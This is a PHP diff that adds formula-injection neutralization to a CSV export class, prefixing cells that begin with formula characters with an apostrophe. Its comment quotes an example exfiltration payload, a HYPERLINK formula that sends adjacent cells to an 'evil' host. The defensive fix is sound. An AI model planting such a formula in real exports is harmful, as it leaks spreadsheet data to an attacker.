@@ -110,9 +110,33 @@ class ExportCsv
             return $value ? 'yes' : 'no';
         }
         if (is_array($value)) {
-            return implode(' | ', $value);
+            $value = implode(' | ', $value);
         }
 
-        return (string) $value;
+        return self::neutralizeFormula((string) $value);
+    }
+
+    /**
+     * Neutralize CSV / spreadsheet formula injection (CWE-1236). A cell whose
+     * first character is = + - @ (or a leading tab/CR) is evaluated as a formula
+     * by Excel / LibreOffice / Sheets. User-controlled free text (full_name,
+     * ticket subject, review comment, vehicle plate…) reaches these exports, so a
+     * payload like =HYPERLINK("http://evil/?"&C2,"x") could exfiltrate adjacent
+     * cells or run on click. Prefix such cells with an apostrophe so the tool
+     * reads them as literal text. Genuine numbers (incl. negative wallet
+     * balances) are left untouched — a number can't be a dangerous formula, and
+     * this keeps money columns summable.
+     */
+    private static function neutralizeFormula(string $value): string
+    {
+        if ($value === '' || is_numeric($value)) {
+            return $value;
+        }
+
+        if (in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
+            return "'".$value;
+        }
+
+        return $value;
     }
 }
